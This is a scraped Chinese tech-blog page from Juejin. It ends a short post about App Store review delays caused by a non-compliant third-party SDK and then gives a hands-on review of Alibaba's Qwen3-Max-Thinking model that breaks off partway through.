.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>AppStore卡审核一直是一个叫人捉摸不透的事情。</p>
<p>有些卡审其实并非偶尔，<code>而是历史发展的必然趋势</code>。</p>
<h3 data-id="heading-1">必然原因</h3>
<p>卡审的原因无非两点，自身有骚操作的业务流程。【审核触发2.3.1隐藏功能判定】</p>
<p>引用了不合规的第三方SDK，这里可能是第三方库组件，也可能是自己二次封装的私有仓库。</p>
<h3 data-id="heading-2">实例分析</h3>
<p>之前帮助一个团队解决隐藏功能触发的卡审问题，<strong>毫不避讳的说大厂的SDK也存在这种卡审的隐患</strong>。</p>
<p>简单来说，在App正常提交审核环节迭代过程中遭遇卡审，期间尝试过撤销重提，也尝试过加急审核。在加急审核的背景下，依然48小时才出结果。</p>
<p>经过几轮排查最终定位为某家大厂的美颜SDK，在移除美颜SDK后审核45分钟顺利通过审核。</p>
<p><strong>好消息过审了，坏消息8800元的SDK白买了。</strong></p>
<h3 data-id="heading-3">正常产品</h3>
<p>AppStore常规产品依然正常。我自己的产品均正常迭代审核。所以，干净的产品不用怕。🪆套娃的打法倒也正常。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48b42b4e1a674c96926768657ed8e84e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaU9T56CU56m26Zmi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=VuSucJ0cME3kjYFsmBAkXvcdel4%3D" alt="222.png" loading="lazy"/></p>
<p>但是，这种卡审情况不排除周六日本身苹果也不审核导致的错觉。如果是上周五晚上提交，这两天出结果属于正常。<code>如果超过5天，那么基本上是卡审了，撤回重提依旧如此。那么可能要无了！</code></p>
<p><code>遵守规则，方得长治久安</code>，最后祝大家大吉大利，今晚过审！</p>
<h3 data-id="heading-4">相关推荐</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FURmC_4vxQv5ttOg8yYe7Eg" target="_blank" title="https://mp.weixin.qq.com/s/URmC_4vxQv5ttOg8yYe7Eg" ref="nofollow noopener noreferrer"># 苹果开发者续费大坑及成功续费方案！亲测有效</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F1bAA90Tzpx03tTHZbdg3aw" target="_blank" title="https://mp.weixin.qq.com/s/1bAA90Tzpx03tTHZbdg3aw" ref="nofollow noopener noreferrer"># AppStore敏感词排查手册，多维度分析Guideline 2.3.1隐藏功能，轻松过审。</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FV2F4BaEYh5HfeUUHm1tI6Q" target="_blank" title="https://mp.weixin.qq.com/s/V2F4BaEYh5HfeUUHm1tI6Q" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（代码篇）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FLs3su8fmMckTocPwMmFaNQ" target="_blank" title="https://mp.weixin.qq.com/s/Ls3su8fmMckTocPwMmFaNQ" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（ASO篇）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484371%26idx%3D1%26sn%3D33568c58e90a5bf4d2612d803ecb2a27%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484371&amp;idx=1&amp;sn=33568c58e90a5bf4d2612d803ecb2a27&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果加急审核是“绿色通道”还是“死亡陷阱”？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3Dea61bd42d5ae8b99d2a56cbfb8d91e88%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484362&amp;idx=1&amp;sn=ea61bd42d5ae8b99d2a56cbfb8d91e88&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果开发者邮箱，突然收到11.2通知严重么？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484413%26idx%3D1%26sn%3D82870d4c8892fa65803a8e05fd5ac938%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484413&amp;idx=1&amp;sn=82870d4c8892fa65803a8e05fd5ac938&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 不想被苹果卡审最好错开这两个提审时间</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484349%26idx%3D1%26sn%3D1c75a6b08cb5de64ddf41a88b61ff108%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484349&amp;idx=1&amp;sn=1c75a6b08cb5de64ddf41a88b61ff108&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 手撕苹果审核4.3是代码问题还是设计问题？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484344%26idx%3D1%26sn%3D4399eb8d8bf82e9c5df26a18b8564cfb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484344&amp;idx=1&amp;sn=4399eb8d8bf82e9c5df26a18b8564cfb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 有幸和Appstore审核人员进行了一场视频会议特此记录。</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[阿里发布了他们最强思考模型，有点东西。。（附实测）]]></title>    <link>https://juejin.cn/post/7602146335216549928</link>    <guid>https://juejin.cn/post/7602146335216549928</guid>    <pubDate>2026-02-03T05:55:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602146335216549928" data-draft-id="7602146335216435240" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="阿里发布了他们最强思考模型，有点东西。。（附实测）"/> <meta itemprop="keywords" content="AIGC,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T05:55:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI袋鼠帝"/> <meta itemprop="url" content="https://juejin.cn/user/2032372037988990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            阿里发布了他们最强思考模型，有点东西。。（附实测）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2032372037988990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI袋鼠帝
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:55:26.000Z" title="Tue Feb 03 2026 05:55:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是熬夜追新模型的袋鼠帝。</p>
<p>昨天晚上，我正准备关电脑睡觉，阿里突然甩出了一个重磅炸弹：Qwen3-Max-Thinking 正式发布。</p>
<p>我看完，反手就点赞+在看</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8a1b4a4b0264616a588a0f98d44c3d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=SA4QEEvDILke6R9zQ0tmZet3%2FUM%3D" alt="图片" loading="lazy"/></p>
<p>不过，说什么数字游民，自由职业，其实我的作息完全掌握 AI 手里。 </p>
<p>AI一进化，我就得起来干活。。。</p>
<p>吐槽归吐槽，身体还是很诚实的。</p>
<p>毕竟作为国产模型之光，千问每一次更新都挺让人期待的。</p>
<p>于是我立马不困了，爬起来连夜实测，看看这次能想会干，比强更强到底怎么样。</p>
<p>Max都是旗舰级的闭源模型，所以性能会更强劲</p>
<p>这次Qwen3-Max-Thinking号称性能媲美 GPT-5.2 和 Gemini 3 Pro，特别是在数学、代码和长逻辑推理上有了质的飞跃。</p>
<p>最关键的是，它的 Agent 能力大幅增强，能像真人一样边用工具边思考，而且幻觉更少。</p>
<p>🤔那岂不是非常适合接入最近爆火的个人AI助手clawdbot中使用？</p>
<blockquote>
<p>介绍clawdbot，以及如何安装使用</p>
<p>袋鼠帝，公众号：袋鼠帝AI客栈开源AI助手 ClawdBot 火爆全网，已狂飙50K Star！附喂饭级安装使用教程</p>
</blockquote>
<p>再给大家聊聊这次更新的核心技术亮点（我觉得非常实用），非常重要：</p>
<p>能看到阿里这次在 Reasoning（推理）路线上走出了一条非常独特的路径。</p>
<ol>
<li>测试时扩展（Test-Time Scaling）：从"人海战术"转向深度反思</li>
</ol>
<p>传统的推理增强往往采用并行采样（Parallel Sampling）策略，即 Best-of-N，通过生成多条推理路径再进行投票或打分。</p>
<p>这种方式虽然有效，但计算冗余极高，边际效应递减明显。 </p>
<p>Qwen3-Max-Thinking 采用了一种“经验累积式迭代”策略。</p>
<p>它利用“经验提取（Experience Extraction）”机制，将上一轮推理中的关键洞见（Insight）提炼出来，注入到下一轮的 Context 中。这使得模型能够在不增加 Token 消耗量级的情况下，通过自我反思修正错误，收敛至更优解。</p>
<p>就好比一些模型解难题，就像是让 100 个普通学生同时做同一道题，然后看谁的答案对（人海战术，浪费资源且容易大家都做错）。 </p>
<p>Qwen3-Max-Thinking像是一个资深学霸，做题时会先打草稿，发现第一步思路不对，立刻总结教训，换个思路继续推导，直到解出答案。</p>
<p>不是一直试错，是在迭代。</p>
<ol start="2">
<li>自适应工具调用：原生Agent的肌肉记忆</li>
</ol>
<p>大多数模型的工具调用依赖于 Prompt Engineering（提示词工程），即告诉模型你有xxx工具，能干什么，请使用它。 </p>
<p>Qwen3-Max-Thinking这次通过大规模的RL（强化学习）后训练，将工具调用内化为模型的原生能力。</p>
<p>它不再需要显式的Trigger，而是基于对任务复杂度的感知，自主决策何时挂起推理、调用 Search 获取实时信息、或调用 Python 解释器进行精确计算等。</p>
<p>这种边想边做的能力，大幅降低了幻觉（Hallucination），也进一步提升了解决真实世界复杂任务的能力。</p>
<ol start="3">
<li>极致的生态兼容：可丝滑接入Claude Code</li>
</ol>
<p>这一点对于开发者至关重要：Qwen3-Max-Thinking 不仅兼容 OpenAI 协议，更原生兼容了 Anthropic API 协议。</p>
<p>这意味着它可以丝滑接入 Claude Code。只需修改 API地址 和 API Key。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d826d3d9d3284e17aea501de18d57d9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=3uqydODAMnZaHV%2BPmEF5F6VYcmk%3D" alt="图片" loading="lazy"/></p>
<p>现在Qwen3-Max-Thinking可以在网页使用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0515920fb0de4cae9ff715edc3e066ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=1X4uoBbNMZqIJ8RDeohMWFG0SMs%3D" alt="图片" loading="lazy"/></p>
<p>也可以通过API使用</p>
<p>接下来，老规矩，咱们直接上实测。</p>
<p>PS：Qwen3-Max-Thinking名字有点长，下文就用Qwen或者Qwen3代替了~</p>
<h3 data-id="heading-0">1.网文圈《校花的贴身高手》</h3>
<p>*由于联网搜索已经自动整合进深度思考（由Agent自行判断是否需要联网），所以只需要打开深度思考即可（看见有读者在别的公众号评论区提问，为什么没有联网搜索了）<br/>
*</p>
<p>这是一部连载了十多年的网络小说，无数人从初中到大学毕业，从乔布斯Iphone时代到LLM时代，还在看这本小说，然而此书作者依然还在日更。</p>
<p>书中剧情有一个关键节点，就是登上天阶岛，来问问Qwen是否能正确找到。</p>
<pre><code class="hljs">prompt：在网络小说，校花的贴身高手中，主角是在哪一章登上天阶岛的？
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52e7761a2d6c43c285c0c706beb0e0a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=3Nlh0fiCTz5D%2Fr2p%2Bzxs0v0NAL0%3D" alt="图片" loading="lazy"/></p>
<p>有意思的是，查看思维链，可以看见，Qwen3-Max-Thinking会有意识地交叉对比不同的结果，防止被干扰，并且思考后给出章节不同的原因和结论，让人感觉非常可靠。</p>
<p>我去QQ阅读APP核实了一下，是正确的</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/155c19e37f8d4a2fb825cbe5740093eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=BR94cgpBVSM0dxnteKZzYHZ0tDw%3D" alt="图片" loading="lazy"/></p>
<p>接下来我又尝试让Qwen3-Max-Thinking用代码给我画个图，看看能不能在超过2000万字的小说中找到主角实力晋升的曲线。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/beb27bbeeab341ccb67362cf24c18616~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=%2FJL%2BHuAYGPWEwZhaR%2BZLhdBVSP4%3D" alt="图片" loading="lazy"/></p>
<p>Qwen3在思维链中意识到，两千万字还是太多了，这个任务无法完成，但是基于我的意图，还是找到了具有代表性的章节和晋升节点，给我画了出来，完成任务</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75a235f8a9f944c291087d7003c149c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=T1pXHBj%2Fw2MmN%2FfbQxxylV5oZso%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-1">2.（斩杀线热梗）逻辑陷阱</h3>
<p>斩杀线最近非常火，我给Qwen3造了一个逻辑陷阱，还和豆包进行对比，看看Qwen会不会陷进去</p>
<pre><code class="hljs language-css" lang="css">prompt：牢<span class="hljs-selector-tag">a</span>是大<span class="hljs-selector-tag">a</span>股买进去之后在坐牢吗
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02e702aa619c4122ad93954c22035eac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=rOGQeeDQuYv1op4uIN37pHbEYyo%3D" alt="图片" loading="lazy"/></p>
<p>Qwen3 完全正确，一下子就意识到这是一个人的网名，然后还告诉我这是常见的误解。仔细看思维链，能发现Qwen居然搜索了x和facebook，但是豆包似乎都没触发网络搜索。这下Qwen 3的Agent能力又赢了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9caaecfd6d9547ca89f99803b464c94e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=ePs4IpKgQcxwIoQ8RxgtqWKJE%2FA%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-2">3.和Gemini 3 pro比较电影测评</h3>
<p>考验在海量信息中网络搜索真相，这点完胜Gemini 3 pro</p>
<p>前两天“重返寂静岭”上映，第一时间就去看了，没想到是烂片，</p>
<p>只能说被吓得莫名其妙，剧情很莫名其妙，看不懂，前面两个女生抱在一起，一个被吓得在刷小红书，一个被吓得在玩微信小游戏，我买的还是最中间的座位，不舍得走，但又一直被吓，主要是剧情莫名其妙。</p>
<p>马上试试AI搜索到的结果，是不是能符合我的真实体验。</p>
<p>先试了Gemini 3：根本没提到最新上映的重返寂静岭。。</p>
<p>而且搜索结果里似乎自相矛盾了，阿凡达同时出现在“值得一看“和“建议避雷”里，让人有点困惑。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16337754ccce40e3b71c26e3937bddb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=IwnV9KJaMWIV%2FNEK4eMxxEbPVTA%3D" alt="图片" loading="lazy"/></p>
<p>又试了这回的Qwen 3，因为交给Agnet自动判断是否需要网络查询了，所以我们只要打开深度思考就好了。</p>
<p>Qwen3—Max甚合我意！简直和我内心的意见一模一样（每一场我都在电影院看过了，AI和我的意见居然一样）</p>
<p>这些影评都是非常真实的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e25e4483d3494e778ac7e349bf00d796~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=z71Ox%2FGL806gbctHQ%2FYNxMvbcbA%3D" alt="图片" loading="lazy"/></p>
<p>我又点开思维链，仔细看看Qwen3具体是如何做到这一点的。</p>
<p>可以看见，Qwen 3在内置Agent的调度下，一边搜索、整理、又搜索，又整理，进行了几轮的整理，才有了最后的准确答案</p>
<p>并且在思维链中可以逐一看见被Qwen3搜索过的每一个影评网站，可以点击进去浏览，能把海量信息汇总并且找到正确的信息，确实不错。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f72f99e767b4dc5bf3b4d75a73b572f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=X0O48ojR%2FcCfxDx6oi0s%2BUDW8A0%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-3">4.记忆（功能上新，类似ChatGPT和Gemini）</h3>
<p>这次千问也终于有了记忆：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15bafe69de6f4d4aa8bb626a95985385~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=6exdsuFtJrs5ZeJj0P8fk4KC9Zc%3D" alt="图片" loading="lazy"/></p>
<p>点击头像，就能在设置里面打开或者关闭记忆。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fe9a89975ef46d08264a943902c3608~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=79GLmNm%2F8emakddlbRTO9zI09Wk%3D" alt="图片" loading="lazy"/></p>
<p>下面做了一个场景预设测试，假如我是一个高考生，平时就爱和AI介绍自己喜欢的事情。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c27b93ca1df24aac9d2edc487991af7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=JjYt8VLxZRRyUhoVmhf8RUMZ%2FQw%3D" alt="图片" loading="lazy"/></p>
<p>那么假如已经到了高考报志愿的时候，Qwen就可以根据我以往所有的聊天偏好，对我进行分析，找到最适合我的专业。（以下新开了一个聊天窗口进行测试），</p>
<p>可以看见，不给任何上下文信息，直接向Qwen 3 提问我适合什么专业。</p>
<p>Qwen 3 的回答是正确的。因为这就是我本人的真实经历，非常认同AI的判断。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33a6db2fc0a14e92858007593f5b53d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=D%2FP8qqyThkqZk4Xg2sDTGl46p7Y%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-4">5.视频总结（支持上传十分钟以内的视频）</h3>
<p>大概十秒钟，总结很顺利，比以前快多了，查看思维链，可以看见一步步梳理脉络</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f689bd8ba6004c3681c737c3ae3964ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=A%2FHsdbhexR4L8iwCOqOlhgk2WgM%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-5">6.预测26年春晚，具身智能机器人表演到什么程度</h3>
<p>时光匆匆又一年，年味渐浓</p>
<p>2026年春晚，宇树科技将第三次登上春晚的舞台。</p>
<p>去年具身智能机器人表演的是《秧BOT》，今年又会进展如何呢？</p>
<p>让Qwen3预测一下今年的具身智能机器人，在春晚的舞台上会有什么样的表演。</p>
